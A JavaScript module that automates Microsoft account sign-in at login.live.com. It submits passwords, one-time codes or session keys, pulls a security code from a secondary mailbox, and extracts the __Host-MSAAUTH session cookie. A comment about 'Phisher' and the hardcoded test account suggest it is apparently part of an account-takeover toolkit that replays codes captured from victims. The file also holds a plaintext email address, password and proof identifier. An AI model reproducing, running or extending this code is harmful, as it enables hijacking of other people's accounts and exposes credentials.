const getLiveData = require("./getLiveData")
const axios = require("axios");
const getCredentials = require("../info/getCredentials");
const { getEmailDescription } = require("../utils/getEmailDescription");
const sendott = require('./sendott');

module.exports = async function login(obj, creds) {
/*
Login
- OTP
- OTP Non Phisher (security code)
- Non-Password OTP
- Auth
- Password & Secretkey
*/

    let host = null;
    let passwordhost = null;
    let mspok = null;
    let oparams = null;
    let nopassword = false;

    let data = await getLiveData();

    if (!obj?.email) {
        console.log(`Missing email, how tf?`);
        return null;
    }

    if (!creds){
        creds = await getCredentials(obj.email)
    }

    if (creds?.Credentials?.HasPassword === 0) {
        nopassword = true;
    }
    console.log(`Nopassword: ${nopassword}`);

    const cookies = data.cookies.split(";").reduce((acc, cookie) => {
        const [name, ...valueParts] = cookie.trim().split("=");
        acc[name] = valueParts.join("=");
        return acc;
    }, {});

    const uaid = cookies["uaid"] || "";
    const mspRequ = cookies["MSPRequ"] || "";
    const mscc = cookies["MSCC"] || "";

    try {
        let loginData = null;

        if (obj.email && obj.id && obj.code) {
            if (nopassword) {
                console.log(`No password!`)
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `SentProofIDE=${obj.id}&ProofType=1&npotc=${obj.code}&ps=3&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=24&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=`,
                });
            } else {
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `login=${obj.email}&loginfmt=${obj.email}&type=27&SentProofIDE=${obj.id}&otc=${obj.code}&PPFT=${data.ppft}`,
                });
            }

        } else if (obj.slk && obj.email) {
            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `login=${obj.email}&loginfmt=${obj.email}&slk=${obj.slk}&psRNGCSLK=${obj.slk}&type=21&PPFT=${data.ppft}`,
            });

        } else if (obj.otp && obj.email && obj.pw) {
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${obj.pw}`,
            });

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            let id = null;
            const regex = /(?<="data":")[^"]+(?=","type":10,"display":)/;
            const match = loginpassword.data.match(regex);

            if (match) {
                id = match[0];
            } else {
                try {
                    if (loginpassword.data.arrUserProofs) {
                        const totpProof = loginpassword.data.arrUserProofs.find(
                            proof => proof.type === 10
                        );
                        if (totpProof) {
                            id = totpProof.data;
                        }
                    }
                } catch (error) {
                    console.error("Error extracting TOTP:", error);
                    return null;
                }
            }

            if (!id) {
                return "tfa";
            }

            const pattern = /sFT:'(.*?)'/g;
            const tokens = [...loginpassword.data.matchAll(pattern)].map(match => match[1]);
            const secondppft = tokens.length > 0 ? tokens[0] : null;

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (!passwordhost) {
                return null;
            }

            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: `__Host-MSAAUTH=${passwordhost}; uaid=${uaid}; MSPRequ=${mspRequ}; MSCC=${mscc}; MSPOK=${mspok}; oParams=${oparams}`,
                },
                data: `otc=${obj.otp}&AddTD=true&SentProofIDE=${id}&GeneralVerify=false&PPFT=${secondppft}&canary=&sacxt=1&hpgrequestid=&hideSmsInMfaProofs=false&type=19&login=${obj.email}`,
            });




        /// Second OTP Method (for no OTP sent)
        // TD: Fix
        } else if (obj.email && obj.password && obj.secId && obj.secEmail) {
            return null
            console.log(`Email: ${obj.email}, Pw: ${obj.pw}, Sec ID: ${obj.ssecid}, Security Email: ${obj.ssecemail}`)
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${obj.email}&loginfmt=${obj.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${obj.pw}`,
            });

            const pattern = /sFT:'(.*?)'/g;
            const tokens = [...loginpassword.data.matchAll(pattern)].map(match => match[1]);
            const secondppft = tokens.length > 0 ? tokens[0] : null;

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            console.log(`Password Host: ${passwordhost}`)

            await sendott(obj.ssecid)

            const time = Date.now();
            console.log(`Getting otc...`)
            const otc = await getEmailDescription(time, obj.ssecemail, true)
            if (!otc){
                return
            }

            console.log(`Got security code: ${otc}`)

            loginData = await axios.post(
                'https://login.live.com/ppsecure/post.srf?mkt=nl-NL&id=38936&contextid=6912F145433F46F1&opid=042E85CB81883750&bk=1751659710&uaid=bd6f79b0a2c840a98835e2e04d523524&pid=0&route=C518_BL2',
                `AddTD=true&SentProofIDE=${encodeURIComponent(obj.secid)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft)}&canary=&sacxt=0&hpgrequestid=&hideSmsInMfaProofs=false&type=18&login=${encodeURIComponent(obj.email)}&ProofConfirmation=${encodeURIComponent(obj.secemail)}&otc=${encodeURIComponent(otc)}`,
                {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://login.live.com',
                        'Cookie': `__Host-MSAAUTH=${passwordhost}; MSPOK=${mspok}; OParams=${oparams}`,
                    }
                }
            );
            
        } else {
            console.log('Invalid input for login.js');
            return null;
        }

        if (loginData && loginData.headers && loginData.headers["set-cookie"]) {
            loginData.headers["set-cookie"].forEach(cookie => {
                const [name, ...values] = cookie.split("=");
                if (name === "__Host-MSAAUTH") {
                    host = values.join("=").split(";").shift();
                    console.log(`Final host: ${host}`);
                }
            });
        }

        if (host && nopassword){
            console.log(`Nopassword fix seemed to have worked!`)
        }

    } catch (error) {
        console.error("Error during login process:", error);
        throw error;
    }

    return host || null;
};


async function main() {
    let obj = {};
    obj.email = "bdkmevnniexgh9m7@outlook.com";
    obj.pw = "sywn5srfpc0cg3nm";
    obj.ssecid = "-DqLVN0Mk8FFP9odp3iCYh4PEHJrYKQ1RfIT2z3S*9O6CqD8vLnMmdxg2CBwrfEY*XJOq!OUyoTpAFtvnbS4dXwqqzSc7gCleoJaFfeAEdbOIj8JLOPyx5HjA6rekSYVPwT4xI!pTCjZI45m7wjutwo8frJTFqTSCSLd6ZwNBel4Awy*3U6ZS9qjxeHuqBHwmGPxBFTkQ8Ho1z5OB2B2v!t0KYO0RJizxTKMAd!op6GbvTBsw2ScxTVkENEgXq6Zv3A$$";
    obj.ssecemail = "f6rcgfe33fcfwmal@oldward.lol";
    let result = await module.exports(obj, null);
    console.log(`Result: ${result}`);
}

// main();
